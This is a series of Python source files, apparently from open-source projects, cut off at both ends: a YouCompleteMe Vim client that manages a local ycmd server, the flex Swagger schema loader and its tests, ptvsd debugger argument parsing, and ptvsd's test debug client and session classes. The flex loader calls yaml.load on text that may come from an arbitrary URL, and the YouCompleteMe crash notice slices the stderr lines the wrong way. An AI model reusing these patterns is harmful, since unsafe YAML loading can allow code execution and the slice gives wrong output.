  USE_ULTISNIPS_DATA = False

# We need this so that Requests doesn't end up using the local HTTP proxy when
# talking to ycmd. Users should actually be setting this themselves when
# configuring a proxy server on their machine, but most don't know they need to
# or how to do it, so we do it for them.
# Relevant issues:
#  https://github.com/Valloric/YouCompleteMe/issues/641
#  https://github.com/kennethreitz/requests/issues/879
os.environ['no_proxy'] = '127.0.0.1,localhost'

# Force the Python interpreter embedded in Vim (in which we are running) to
# ignore the SIGINT signal. This helps reduce the fallout of a user pressing
# Ctrl-C in Vim.
signal.signal( signal.SIGINT, signal.SIG_IGN )

NUM_YCMD_STDERR_LINES_ON_CRASH = 30
SERVER_CRASH_MESSAGE_STDERR_FILE = (
  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +
  'Stderr (last {0} lines):\n\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH ) )
SERVER_CRASH_MESSAGE_SAME_STDERR = (
  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). '
  ' check console output for logs!' )
SERVER_IDLE_SUICIDE_SECONDS = 10800  # 3 hours


class YouCompleteMe( object ):
  def __init__( self, user_options ):
    self._user_options = user_options
    self._user_notified_about_crash = False
    self._diag_interface = DiagnosticInterface( user_options )
    self._omnicomp = OmniCompleter( user_options )
    self._latest_completion_request = None
    self._latest_file_parse_request = None
    self._server_stdout = None
    self._server_stderr = None
    self._server_popen = None
    self._filetypes_with_keywords_loaded = set()
    self._temp_options_filename = None                    
    self._ycmd_keepalive = YcmdKeepalive()
    self._SetupServer()
    self._ycmd_keepalive.Start()

  def _SetupServer( self ):
    server_port = utils.GetUnusedLocalhostPort()
    with tempfile.NamedTemporaryFile( delete = False ) as options_file:
      self._temp_options_filename = options_file.name                    
      json.dump( dict( self._user_options ), options_file )
      options_file.flush()

      args = [ utils.PathToPythonInterpreter(),
               _PathToServerScript(),
               '--port={0}'.format( server_port ),
               '--options_file={0}'.format( options_file.name ),
               '--log={0}'.format( self._user_options[ 'server_log_level' ] ),
               '--idle_suicide_seconds={0}'.format(
                  SERVER_IDLE_SUICIDE_SECONDS )]

      if not self._user_options[ 'server_use_vim_stdout' ]:
        filename_format = os.path.join( utils.PathToTempDir(),
                                        'server_{port}_{std}.log' )

        self._server_stdout = filename_format.format( port = server_port,
                                                      std = 'stdout' )
        self._server_stderr = filename_format.format( port = server_port,
                                                      std = 'stderr' )
        args.append('--stdout={0}'.format( self._server_stdout ))
        args.append('--stderr={0}'.format( self._server_stderr ))

        if self._user_options[ 'server_keep_logfiles' ]:
          args.append('--keep_logfiles')

      self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)
      BaseRequest.server_location = 'http://localhost:' + str( server_port )

    self._NotifyUserIfServerCrashed()

  def _IsServerAlive( self ):
    returncode = self._server_popen.poll()
    # When the process hasn't finished yet, poll() returns None.
    return returncode is None


  def _NotifyUserIfServerCrashed( self ):
    if self._user_notified_about_crash or self._IsServerAlive():
      return
    self._user_notified_about_crash = True
    if self._server_stderr:
      with open( self._server_stderr, 'r' ) as server_stderr_file:
        error_output = ''.join( server_stderr_file.readlines()[
            : - NUM_YCMD_STDERR_LINES_ON_CRASH ] )
        vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE +
                                        error_output )
    else:
        vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR )


  def ServerPid( self ):
    if not self._server_popen:
      return -1
    return self._server_popen.pid


  def _ServerCleanup( self ):
    if self._IsServerAlive():
      self._server_popen.terminate()
    utils.RemoveIfExists( self._temp_options_filename )


  def RestartServer( self ):
    vimsupport.PostVimMessage( 'Restarting ycmd server...' )
    self._user_notified_about_crash = False
    self._ServerCleanup()
    self._SetupServer()


  def CreateCompletionRequest( self, force_semantic = False ):
    # We have to store a reference to the newly created CompletionRequest
    # because VimScript can't store a reference to a Python object across
    # function calls... Thus we need to keep this request somewhere.
    if ( not self.NativeFiletypeCompletionAvailable() and
         self.CurrentFiletypeCompletionEnabled() and
         self._omnicomp.ShouldUseNow() ):
      self._latest_completion_request = OmniCompletionRequest( self._omnicomp )
    else:
      extra_data = {}
      self._AddExtraConfDataIfNeeded( extra_data )
      if force_semantic:
        extra_data[ 'force_semantic' ] = True

      self._latest_completion_request = ( CompletionRequest( extra_data )
                                          if self._IsServerAlive() else
                                          None )
    return self._latest_completion_request


  def SendCommandRequest( self, arguments, completer ):
    if self._IsServerAlive():
      return SendCommandRequest( arguments, completer )


  def GetDefinedSubcommands( self ):
    if self._IsServerAlive():
      return BaseRequest.PostDataToHandler( BuildRequestData(),
                                            'defined_subcommands' )
    else:
      return []


  def GetCurrentCompletionRequest( self ):
    return self._latest_completion_request


  def GetOmniCompleter( self ):
    return self._omnicomp


  def NativeFiletypeCompletionAvailable( self ):
    return any( [ FiletypeCompleterExistsForFiletype( x ) for x in
                  vimsupport.CurrentFiletypes() ] )


  def NativeFiletypeCompletionUsable( self ):
    return ( self.CurrentFiletypeCompletionEnabled() and
             self.NativeFiletypeCompletionAvailable() )


  def OnFileReadyToParse( self ):
    self._omnicomp.OnFileReadyToParse( None )

    if not self._IsServerAlive():
      self._NotifyUserIfServerCrashed()

    extra_data = {}
    self._AddTagsFilesIfNeeded( extra_data )
    self._AddSyntaxDataIfNeeded( extra_data )
    self._AddExtraConfDataIfNeeded( extra_data )

    self._latest_file_parse_request = EventNotification( 'FileReadyToParse',
                                                          extra_data )
    self._latest_file_parse_request.Start()


  def OnBufferUnload( self, deleted_buffer_file ):
    if not self._IsServerAlive():
      return
    SendEventNotificationAsync( 'BufferUnload',
                                { 'unloaded_buffer': deleted_buffer_file } )


  def OnBufferVisit( self ):
    if not self._IsServerAlive():
      return
    extra_data = {}
    _AddUltiSnipsDataIfNeeded( extra_data )
    SendEventNotificationAsync( 'BufferVisit', extra_data )


  def OnInsertLeave( self ):
    if not self._IsServerAlive():
      return
    SendEventNotificationAsync( 'InsertLeave' )


  def OnCursorMoved( self ):
    self._diag_interface.OnCursorMoved()


  def OnVimLeave( self ):
    self._ServerCleanup()


  def OnCurrentIdentifierFinished( self ):
    if not self._IsServerAlive():
      return
    SendEventNotificationAsync( 'CurrentIdentifierFinished' )


  def DiagnosticsForCurrentFileReady( self ):
    return bool( self._latest_file_parse_request and
                 self._latest_file_parse_request.Done() )


  def GetDiagnosticsFromStoredRequest( self, qflist_format = False ):
    if self.DiagnosticsForCurrentFileReady():
      diagnostics = self._latest_file_parse_request.Response()
      # We set the diagnostics request to None because we want to prevent
      # Syntastic from repeatedly refreshing the buffer with the same diags.
      # Setting this to None makes DiagnosticsForCurrentFileReady return False
      # until the next request is created.
      self._latest_file_parse_request = None
      if qflist_format:
        return vimsupport.ConvertDiagnosticsToQfList( diagnostics )
      else:
        return diagnostics
    return []


  def UpdateDiagnosticInterface( self ):
    if not self.DiagnosticsForCurrentFileReady():
      return
    self._diag_interface.UpdateWithNewDiagnostics(
      self.GetDiagnosticsFromStoredRequest() )


  def ShowDetailedDiagnostic( self ):
    if not self._IsServerAlive():
      return
    try:
      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),
                                                  'detailed_diagnostic' )
      if 'message' in debug_info:
        vimsupport.EchoText( debug_info[ 'message' ] )
    except ServerError as e:
      vimsupport.PostVimMessage( str( e ) )


  def DebugInfo( self ):
    if self._IsServerAlive():
      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),
                                                  'debug_info' )
    else:
      debug_info = 'Server crashed, no debug info from server'
    debug_info += '\nServer running at: {0}'.format(
        BaseRequest.server_location )
    debug_info += '\nServer process ID: {0}'.format( self._server_popen.pid )
    if self._server_stderr or self._server_stdout:
      debug_info += '\nServer logfiles:\n  {0}\n  {1}'.format(
        self._server_stdout,
        self._server_stderr )

    return debug_info


  def CurrentFiletypeCompletionEnabled( self ):
    filetypes = vimsupport.CurrentFiletypes()
    filetype_to_disable = self._user_options[
      'filetype_specific_completion_to_disable' ]
    return not all([ x in filetype_to_disable for x in filetypes ])


  def _AddSyntaxDataIfNeeded( self, extra_data ):
    if not self._user_options[ 'seed_identifiers_with_syntax' ]:
      return
    filetype = vimsupport.CurrentFiletypes()[ 0 ]
    if filetype in self._filetypes_with_keywords_loaded:
      return

    self._filetypes_with_keywords_loaded.add( filetype )
    extra_data[ 'syntax_keywords' ] = list(
       syntax_parse.SyntaxKeywordsForCurrentBuffer() )


  def _AddTagsFilesIfNeeded( self, extra_data ):
    def GetTagFiles():
      tag_files = vim.eval( 'tagfiles()' )
      current_working_directory = os.getcwd()
      return [ os.path.join( current_working_directory, x ) for x in tag_files ]

    if not self._user_options[ 'collect_identifiers_from_tags_files' ]:
      return
    extra_data[ 'tag_files' ] = GetTagFiles()


  def _AddExtraConfDataIfNeeded( self, extra_data ):
    def BuildExtraConfData( extra_conf_vim_data ):
      return dict( ( expr, vimsupport.VimExpressionToPythonType( expr ) )
                   for expr in extra_conf_vim_data )

    extra_conf_vim_data = self._user_options[ 'extra_conf_vim_data' ]
    if extra_conf_vim_data:
      extra_data[ 'extra_conf_data' ] = BuildExtraConfData(
        extra_conf_vim_data )


def _PathToServerScript():
  dir_of_current_script = os.path.dirname( os.path.abspath( __file__ ) )
  return os.path.join( dir_of_current_script, 'server/ycmd.py' )


def _AddUltiSnipsDataIfNeeded( extra_data ):
  if not USE_ULTISNIPS_DATA:
    return

  try:
    rawsnips = UltiSnips_Manager._snips( '', 1 )
  except:
    return

  # UltiSnips_Manager._snips() returns a class instance where:
  # class.trigger - name of snippet trigger word ( e.g. defn or testcase )
  # class.description - description of the snippet
  extra_data[ 'ultisnips_snippets' ] = [ { 'trigger': x.trigger,
                                           'description': x.description
                                         } for x in rawsnips ]



from __future__ import unicode_literals

from six.moves import urllib_parse as urlparse
import os
import collections
import requests

import six
import json
import yaml

from flex.context_managers import ErrorDict
from flex.exceptions import ValidationError
from flex.loading.definitions import (
    definitions_validator,
)
from flex.loading.schema import (
    swagger_schema_validator,
)
from flex.loading.schema.paths.path_item.operation.responses.single.schema import (
    schema_validator,
)
from flex.http import (
    normalize_request,
    normalize_response,
)
from flex.validation.common import validate_object
from flex.validation.request import validate_request
from flex.validation.response import validate_response


def load_source(source):
    """
    Common entry point for loading some form of raw swagger schema.

    Supports:
        - python object (dictionary-like)
        - path to yaml file
        - path to json file
        - file object (json or yaml).
        - json string.
        - yaml string.
    """
    if isinstance(source, collections.Mapping):
        return source
    elif hasattr(source, 'read') and callable(source.read):
        raw_source = source.read()
    elif os.path.exists(os.path.expanduser(str(source))):
        with open(os.path.expanduser(str(source)), 'r') as source_file:
            raw_source = source_file.read()
    elif isinstance(source, six.string_types):
        parts = urlparse.urlparse(source)
        if parts.scheme and parts.netloc:
            response = requests.get(source)
            if isinstance(response.content, six.binary_type):
                raw_source = six.text_type(response.content, encoding='utf-8')
            else:
                raw_source = response.content
        else:
            raw_source = source

    try:
        try:
            return json.loads(raw_source)
        except ValueError:
            pass

        try:
            return yaml.load(raw_source)                    
        except (yaml.scanner.ScannerError, yaml.parser.ParserError):
            pass
    except NameError:
        pass

    raise ValueError(
        "Unable to parse `{0}`.  Tried yaml and json.".format(source),
    )


def parse(raw_schema):
    context = {
        'deferred_references': set(),
    }
    swagger_definitions = definitions_validator(raw_schema, context=context)

    swagger_schema = swagger_schema_validator(
        raw_schema,
        context=swagger_definitions,
    )
    return swagger_schema


def load(target):
    """
    Given one of the supported target formats, load a swagger schema into it's
    python representation.
    """
    raw_schema = load_source(target)
    return parse(raw_schema)


def validate(raw_schema, target=None, **kwargs):
    """
    Given the python representation of a JSONschema as defined in the swagger
    spec, validate that the schema complies to spec.  If `target` is provided,
    that target will be validated against the provided schema.
    """
    schema = schema_validator(raw_schema, **kwargs)
    if target is not None:
        validate_object(target, schema=schema, **kwargs)


def validate_api_request(schema, raw_request):
    request = normalize_request(raw_request)

    with ErrorDict():
        validate_request(request=request, schema=schema)


def validate_api_response(schema, raw_response, request_method='get', raw_request=None):
    """
    Validate the response of an api call against a swagger schema.
    """
    request = None
    if raw_request is not None:
        request = normalize_request(raw_request)

    response = None
    if raw_response is not None:
        response = normalize_response(raw_response, request=request)

    if response is not None:
        validate_response(
            response=response,
            request_method=request_method,
            schema=schema
        )


def validate_api_call(schema, raw_request, raw_response):
    """
    Validate the request/response cycle of an api call against a swagger
    schema.  Request/Response objects from the `requests` and `urllib` library
    are supported.
    """
    request = normalize_request(raw_request)

    with ErrorDict() as errors:
        try:
            validate_request(
                request=request,
                schema=schema,
            )
        except ValidationError as err:
            errors['request'].add_error(err.messages or getattr(err, 'detail'))
            return

        response = normalize_response(raw_response, raw_request)

        try:
            validate_response(
                response=response,
                request_method=request.method,
                schema=schema
            )
        except ValidationError as err:
            errors['response'].add_error(err.messages or getattr(err, 'detail'))

from __future__ import unicode_literals

import tempfile
import collections

import six

import json
import yaml

from flex.core import load_source


def test_native_mapping_is_passthrough():
    source = {'foo': 'bar'}
    result = load_source(source)

    assert result == source


def test_json_string():
    native = {'foo': 'bar'}                    
    source = json.dumps(native)
    result = load_source(source)

    assert result == native


def test_yaml_string():
    native = {'foo': 'bar'}                    
    source = yaml.dump(native)
    result = load_source(source)

    assert result == native


def test_json_file_object():
    native = {'foo': 'bar'}                    
    source = json.dumps(native)

    tmp_file = tempfile.NamedTemporaryFile(mode='w')
    tmp_file.write(source)
    tmp_file.file.seek(0)

    with open(tmp_file.name) as json_file:
        result = load_source(json_file)

    assert result == native


def test_json_file_path():
    native = {'foo': 'bar'}                    
    source = json.dumps(native)

    tmp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.json')
    tmp_file.write(source)
    tmp_file.flush()

    result = load_source(tmp_file.name)

    assert result == native


def test_yaml_file_object():
    native = {'foo': 'bar'}                    
    source = yaml.dump(native)

    tmp_file = tempfile.NamedTemporaryFile(mode='w')
    tmp_file.write(source)
    tmp_file.flush()

    with open(tmp_file.name) as yaml_file:
        result = load_source(yaml_file)

    assert result == native


def test_yaml_file_path():
    native = {'foo': 'bar'}                    
    source = yaml.dump(native)

    tmp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.yaml')
    tmp_file.write(source)
    tmp_file.flush()

    result = load_source(tmp_file.name)

    assert result == native


def test_url(httpbin):
    native = {
        'origin': '127.0.0.1',
        #'headers': {
        #    'Content-Length': '',
        #    'Accept-Encoding': 'gzip, deflate',
        #    'Host': '127.0.0.1:54634',
        #    'Accept': '*/*',
        #    'User-Agent': 'python-requests/2.4.3 CPython/2.7.8 Darwin/14.0.0',
        #    'Connection': 'keep-alive',
        #},
        'args': {},
        #'url': 'http://127.0.0.1:54634/get',
    }
    source = httpbin.url + '/get'
    result = load_source(source)
    assert isinstance(result, collections.Mapping)
    result.pop('headers')
    result.pop('url')
    assert result == native

# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License. See LICENSE in the project root
# for license information.

import argparse
import os.path
import sys

from ptvsd._local import debug_main, run_main
from ptvsd.socket import Address
from ptvsd.version import __version__, __author__  # noqa


##################################
# the script

"""
For the PyDevd CLI handling see:

  https://github.com/fabioz/PyDev.Debugger/blob/master/_pydevd_bundle/pydevd_command_line_handling.py
  https://github.com/fabioz/PyDev.Debugger/blob/master/pydevd.py#L1450  (main func)
"""  # noqa

PYDEVD_OPTS = {
    '--file',
    '--client',
    #'--port',
    '--vm_type',
}

PYDEVD_FLAGS = {
    '--DEBUG',
    '--DEBUG_RECORD_SOCKET_READS',
    '--cmd-line',
    '--module',
    '--multiproc',
    '--multiprocess',
    '--print-in-debugger-startup',
    '--save-signatures',
    '--save-threading',
    '--save-asyncio',
    '--server',
    '--qt-support=auto',
}

USAGE = """
  {0} [-h] [-V] [--nodebug] [--host HOST | --server-host HOST] --port PORT -m MODULE [arg ...]
  {0} [-h] [-V] [--nodebug] [--host HOST | --server-host HOST] --port PORT FILENAME [arg ...]
"""  # noqa


def parse_args(argv=None):
    """Return the parsed args to use in main()."""
    if argv is None:
        argv = sys.argv
        prog = argv[0]
        if prog == __file__:
            prog = '{} -m ptvsd'.format(os.path.basename(sys.executable))
    else:
        prog = argv[0]
    argv = argv[1:]

    supported, pydevd, script = _group_args(argv)
    args = _parse_args(prog, supported)
    # '--' is used in _run_args to extract pydevd specific args
    extra = pydevd + ['--']
    if script:
        extra += script
    return args, extra


def _group_args(argv):
    supported = []
    pydevd = []
    script = []

    try:
        pos = argv.index('--')
    except ValueError:
        script = []
    else:
        script = argv[pos + 1:]
        argv = argv[:pos]

    for arg in argv:
        if arg == '-h' or arg == '--help':
            return argv, [], script

    gottarget = False
    skip = 0
    for i in range(len(argv)):
        if skip:
            skip -= 1
            continue

        arg = argv[i]
        try:
            nextarg = argv[i + 1]
        except IndexError:
            nextarg = None

        # TODO: Deprecate the PyDevd arg support.
        # PyDevd support
        if gottarget:
            script = argv[i:] + script
            break
        if arg == '--client':
            arg = '--host'
        elif arg == '--file':
            if nextarg is None:  # The filename is missing...
                pydevd.append(arg)
                continue  # This will get handled later.
            if nextarg.endswith(':') and '--module' in pydevd:
                pydevd.remove('--module')
                arg = '-m'
                argv[i + 1] = nextarg = nextarg[:-1]
            else:
                arg = nextarg
                skip += 1

        if arg in PYDEVD_OPTS:
            pydevd.append(arg)
            if nextarg is not None:
                pydevd.append(nextarg)
            skip += 1
        elif arg in PYDEVD_FLAGS:
            pydevd.append(arg)
        elif arg == '--nodebug':
            supported.append(arg)

        # ptvsd support
        elif arg in ('--host', '--server-host', '--port', '-m'):
            if arg == '-m':
                gottarget = True
            supported.append(arg)
            if nextarg is not None:
                supported.append(nextarg)
            skip += 1
        elif arg in ('--single-session',):                    
            supported.append(arg)
        elif not arg.startswith('-'):
            supported.append(arg)
            gottarget = True

        # unsupported arg
        else:
            supported.append(arg)
            break

    return supported, pydevd, script


def _parse_args(prog, argv):
    parser = argparse.ArgumentParser(
        prog=prog,
        usage=USAGE.format(prog),
    )
    parser.add_argument('--nodebug', action='store_true')
    host = parser.add_mutually_exclusive_group()
    host.add_argument('--host')
    host.add_argument('--server-host')
    parser.add_argument('--port', type=int, required=True)

    target = parser.add_mutually_exclusive_group(required=True)
    target.add_argument('-m', dest='module')
    target.add_argument('filename', nargs='?')

    parser.add_argument('--single-session', action='store_true')
    parser.add_argument('-V', '--version', action='version')
    parser.version = __version__

    args = parser.parse_args(argv)
    ns = vars(args)

    serverhost = ns.pop('server_host', None)
    clienthost = ns.pop('host', None)
    if serverhost:
        args.address = Address.as_server(serverhost, ns.pop('port'))
    elif not clienthost:
        if args.nodebug:
            args.address = Address.as_client(clienthost, ns.pop('port'))
        else:
            args.address = Address.as_server(clienthost, ns.pop('port'))
    else:
        args.address = Address.as_client(clienthost, ns.pop('port'))

    module = ns.pop('module')
    filename = ns.pop('filename')
    if module is None:
        args.name = filename
        args.kind = 'script'
    else:
        args.name = module
        args.kind = 'module'
    #if argv[-1] != args.name or (module and argv[-1] != '-m'):
    #    parser.error('script/module must be last arg')

    return args


def main(addr, name, kind, extra=(), nodebug=False, **kwargs):
    if nodebug:
        run_main(addr, name, kind, *extra, **kwargs)
    else:
        debug_main(addr, name, kind, *extra, **kwargs)


if __name__ == '__main__':
    args, extra = parse_args()
    main(args.address, args.name, args.kind, extra, nodebug=args.nodebug,
         singlesession=args.single_session)                    

from __future__ import absolute_import

import os
import traceback
import warnings

from ptvsd.socket import Address
from ptvsd._util import new_hidden_thread, Closeable, ClosedError
from .debugadapter import DebugAdapter, wait_for_socket_server
from .debugsession import DebugSession

# TODO: Add a helper function to start a remote debugger for testing
# remote debugging?


class _LifecycleClient(Closeable):

    SESSION = DebugSession

    def __init__(
            self,
            addr=None,
            port=8888,
            breakpoints=None,
            connecttimeout=1.0,
    ):
        super(_LifecycleClient, self).__init__()
        self._addr = Address.from_raw(addr, defaultport=port)
        self._connecttimeout = connecttimeout
        self._adapter = None
        self._session = None

        self._breakpoints = breakpoints

    @property
    def adapter(self):
        return self._adapter

    @property
    def session(self):
        return self._session

    def start_debugging(self, launchcfg):
        if self.closed:
            raise RuntimeError('debug client closed')
        if self._adapter is not None:
            raise RuntimeError('debugger already running')
        assert self._session is None

        raise NotImplementedError

    def stop_debugging(self):
        if self.closed:
            raise RuntimeError('debug client closed')
        if self._adapter is None:
            raise RuntimeError('debugger not running')

        if self._session is not None:
            self._detach()

        try:
            self._adapter.close()
        except ClosedError:
            pass
        self._adapter = None

    def attach_pid(self, pid, **kwargs):
        if self.closed:
            raise RuntimeError('debug client closed')
        if self._adapter is None:
            raise RuntimeError('debugger not running')
        if self._session is not None:
            raise RuntimeError('already attached')

        raise NotImplementedError

    def attach_socket(self, addr=None, adapter=None, **kwargs):
        if self.closed:
            raise RuntimeError('debug client closed')
        if adapter is None:
            adapter = self._adapter
        elif self._adapter is not None:
            raise RuntimeError('already using managed adapter')
        if adapter is None:
            raise RuntimeError('debugger not running')
        if self._session is not None:
            raise RuntimeError('already attached')

        if addr is None:
            addr = adapter.address
        self._attach(addr, **kwargs)
        return self._session

    def detach(self, adapter=None):
        if self.closed:
            raise RuntimeError('debug client closed')
        if self._session is None:
            raise RuntimeError('not attached')
        if adapter is None:
            adapter = self._adapter
        assert adapter is not None
        if not self._session.is_client:
            raise RuntimeError('detach not supported')

        self._detach()

    # internal methods

    def _close(self):
        if self._session is not None:
            try:
                self._session.close()
            except ClosedError:
                pass
        if self._adapter is not None:
            try:
                self._adapter.close()
            except ClosedError:
                pass

    def _launch(self,
                argv,
                script=None,
                wait_for_connect=None,
                detachable=True,
                env=None,
                cwd=None,
                **kwargs):
        if script is not None:
            def start(*args, **kwargs):
                return DebugAdapter.start_wrapper_script(
                    script, *args, **kwargs)
        else:
            start = DebugAdapter.start
        new_addr = Address.as_server if detachable else Address.as_client
        addr = new_addr(None, self._addr.port)
        self._adapter = start(argv, addr=addr, env=env, cwd=cwd)

        if wait_for_connect:
            wait_for_connect()
        else:
            wait_for_socket_server(addr)                    
            self._attach(addr, **kwargs)

    def _attach(self, addr, **kwargs):
        if addr is None:
            addr = self._addr
        assert addr.host == 'localhost'
        self._session = self.SESSION.create_client(addr, **kwargs)

    def _detach(self):
        session = self._session
        if session is None:
            return
        self._session = None
        try:
            session.close()
        except ClosedError:
            pass


class DebugClient(_LifecycleClient):
    """A high-level abstraction of a debug client (i.e. editor)."""

    # TODO: Manage breakpoints, etc.
    # TODO: Add debugger methods here (e.g. "pause").


class EasyDebugClient(DebugClient):
    def start_detached(self, argv):
        """Start an adapter in a background process."""
        if self.closed:
            raise RuntimeError('debug client closed')
        if self._adapter is not None:
            raise RuntimeError('debugger already running')
        assert self._session is None

        # TODO: Launch, handshake and detach?
        self._adapter = DebugAdapter.start(argv, port=self._port)
        return self._adapter

    def host_local_debugger(self,
                            argv,
                            script=None,
                            env=None,
                            cwd=None,
                            **kwargs):  # noqa
        if self.closed:
            raise RuntimeError('debug client closed')
        if self._adapter is not None:
            raise RuntimeError('debugger already running')
        assert self._session is None
        addr = ('localhost', self._addr.port)

        self._run_server_ex = None

        def run():
            try:
                self._session = self.SESSION.create_server(addr, **kwargs)
            except Exception as ex:
                self._run_server_ex = traceback.format_exc()

        t = new_hidden_thread(
            target=run,
            name='test.client',
        )
        t.start()

        def wait():
            t.join(timeout=self._connecttimeout)
            if t.is_alive():
                warnings.warn('timed out waiting for connection')
            if self._session is None:
                message = 'unable to connect after {} secs'.format(  # noqa
                    self._connecttimeout)
                if self._run_server_ex is None:
                    raise Exception(message)
                else:
                    message = message + os.linesep + self._run_server_ex # noqa
                    raise Exception(message)

            # The adapter will close when the connection does.

        self._launch(
            argv,
            script=script,
            wait_for_connect=wait,
            detachable=False,
            env=env,
            cwd=cwd)

        return self._adapter, self._session

    def launch_script(self, filename, *argv, **kwargs):
        if self.closed:
            raise RuntimeError('debug client closed')
        if self._adapter is not None:
            raise RuntimeError('debugger already running')
        assert self._session is None

        argv = [
            filename,
        ] + list(argv)
        if kwargs.pop('nodebug', False):
            argv.insert(0, '--nodebug')
        self._launch(argv, **kwargs)
        return self._adapter, self._session

    def launch_module(self, module, *argv, **kwargs):
        if self.closed:
            raise RuntimeError('debug client closed')
        if self._adapter is not None:
            raise RuntimeError('debugger already running')
        assert self._session is None

        argv = [
            '-m',
            module,
        ] + list(argv)
        if kwargs.pop('nodebug', False):
            argv.insert(0, '--nodebug')
        self._launch(argv, **kwargs)
        return self._adapter, self._session

from __future__ import absolute_import, print_function

import contextlib
import json
import socket
import sys
import time
import threading
import warnings

from ptvsd._util import new_hidden_thread, Closeable, ClosedError
from .message import (
    raw_read_all as read_messages,
    raw_write_one as write_message
)
from .socket import (
    Connection, create_server, create_client, close,
    recv_as_read, send_as_write,
    timeout as socket_timeout)
from .threading import get_locked_and_waiter
from .vsc import parse_message


class DebugSessionConnection(Closeable):

    VERBOSE = False
    #VERBOSE = True

    TIMEOUT = 5.0

    @classmethod
    def create_client(cls, addr, **kwargs):
        def connect(addr, timeout):
            sock = create_client()
            for _ in range(int(timeout * 10)):
                try:
                    sock.connect(addr)
                except (OSError, socket.error):
                    if cls.VERBOSE:
                        print('+', end='')
                        sys.stdout.flush()
                    time.sleep(0.1)
                else:
                    break
            else:
                raise RuntimeError('could not connect')
            return sock
        return cls._create(connect, addr, **kwargs)

    @classmethod
    def create_server(cls, addr, **kwargs):
        def connect(addr, timeout):
            server = create_server(addr)
            with socket_timeout(server, timeout):
                client, _ = server.accept()
            return Connection(client, server)
        return cls._create(connect, addr, **kwargs)

    @classmethod
    def _create(cls, connect, addr, timeout=None):
        if timeout is None:
            timeout = cls.TIMEOUT
        sock = connect(addr, timeout)
        if cls.VERBOSE:
            print('connected')
        self = cls(sock, ownsock=True)
        self._addr = addr
        return self

    def __init__(self, sock, ownsock=False):
        super(DebugSessionConnection, self).__init__()
        self._sock = sock
        self._ownsock = ownsock

    @property
    def is_client(self):
        try:
            return self._sock.server is None
        except AttributeError:
            return True

    def iter_messages(self):
        if self.closed:
            raise RuntimeError('connection closed')

        def stop():
            return self.closed
        read = recv_as_read(self._sock)
        for msg, _, _ in read_messages(read, stop=stop):
            if self.VERBOSE:
                print(repr(msg))
            yield parse_message(msg)

    def send(self, req):
        if self.closed:
            raise RuntimeError('connection closed')

        def stop():
            return self.closed
        write = send_as_write(self._sock)
        body = json.dumps(req)
        write_message(write, body, stop=stop)

    # internal methods

    def _close(self):
        if self._ownsock:
            close(self._sock)


class DebugSession(Closeable):

    VERBOSE = False
    #VERBOSE = True

    HOST = 'localhost'
    PORT = 8888

    TIMEOUT = None

    @classmethod
    def create_client(cls, addr=None, **kwargs):
        if addr is None:
            addr = (cls.HOST, cls.PORT)
        conn = DebugSessionConnection.create_client(
            addr,
            timeout=kwargs.get('timeout'),
        )
        return cls(conn, owned=True, **kwargs)

    @classmethod
    def create_server(cls, addr=None, **kwargs):
        if addr is None:
            addr = (cls.HOST, cls.PORT)
        conn = DebugSessionConnection.create_server(addr, **kwargs)
        return cls(conn, owned=True, **kwargs)

    def __init__(self, conn, seq=1000, handlers=(), timeout=None, owned=False):
        super(DebugSession, self).__init__()
        self._conn = conn
        self._seq = seq
        self._timeout = timeout
        self._owned = owned

        self._handlers = []
        for handler in handlers:
            if callable(handler):
                self._add_handler(handler)
            else:
                self._add_handler(*handler)
        self._received = []
        self._listenerthread = new_hidden_thread(
            target=self._listen,
            name='test.session',
        )
        self._listenerthread.start()

    @property
    def is_client(self):
        return self._conn.is_client

    @property
    def received(self):
        return list(self._received)

    def _create_request(self, command, **args):
        seq = self._seq
        self._seq += 1
        return {
            'type': 'request',
            'seq': seq,
            'command': command,
            'arguments': args,
        }

    def send_request(self, command, **args):
        if self.closed:
            raise RuntimeError('session closed')

        wait = args.pop('wait', False)
        req = self._create_request(command, **args)
        if self.VERBOSE:
            msg = parse_message(req)
            print(' <-', msg)

        if wait:
            with self.wait_for_response(req) as resp:
                self._conn.send(req)
            resp_awaiter = AwaitableResponse(req, lambda: resp["msg"])
        else:
            resp_awaiter = self._get_awaiter_for_request(req, **args)
            self._conn.send(req)
        return resp_awaiter

    def add_handler(self, handler, **kwargs):
        if self.closed:
            raise RuntimeError('session closed')

        self._add_handler(handler, **kwargs)

    @contextlib.contextmanager
    def wait_for_event(self, event, **kwargs):
        if self.closed:
            raise RuntimeError('session closed')
        result = {'msg': None}

        def match(msg):
            result['msg'] = msg
            return msg.type == 'event' and msg.event == event
        handlername = 'event {!r}'.format(event)
        with self._wait_for_message(match, handlername, **kwargs):
            yield result

    def get_awaiter_for_event(self, event, condition=lambda msg: True, **kwargs): # noqa
        if self.closed:
            raise RuntimeError('session closed')
        result = {'msg': None}

        def match(msg):
            result['msg'] = msg
            return msg.type == 'event' and msg.event == event and condition(msg) # noqa
        handlername = 'event {!r}'.format(event)
        evt = self._get_message_handle(match, handlername)

        return AwaitableEvent(event, lambda: result["msg"], evt)

    def _get_awaiter_for_request(self, req, **kwargs):
        if self.closed:
            raise RuntimeError('session closed')

        try:
            command, seq = req.command, req.seq
        except AttributeError:
            command, seq = req['command'], req['seq']
        result = {'msg': None}

        def match(msg):
            if msg.type != 'response':
                return False
            result['msg'] = msg
            return msg.request_seq == seq
        handlername = 'response (cmd:{} seq:{})'.format(command, seq)
        evt = self._get_message_handle(match, handlername)

        return AwaitableResponse(req, lambda: result["msg"], evt)

    @contextlib.contextmanager
    def wait_for_response(self, req, **kwargs):
        if self.closed:
            raise RuntimeError('session closed')

        try:
            command, seq = req.command, req.seq
        except AttributeError:
            command, seq = req['command'], req['seq']
        result = {'msg': None}

        def match(msg):
            if msg.type != 'response':
                return False
            result['msg'] = msg
            return msg.request_seq == seq
        handlername = 'response (cmd:{} seq:{})'.format(command, seq)
        with self._wait_for_message(match, handlername, **kwargs):
            yield result

    # internal methods

    def _close(self):
        if self._owned:
            try:
                self._conn.close()
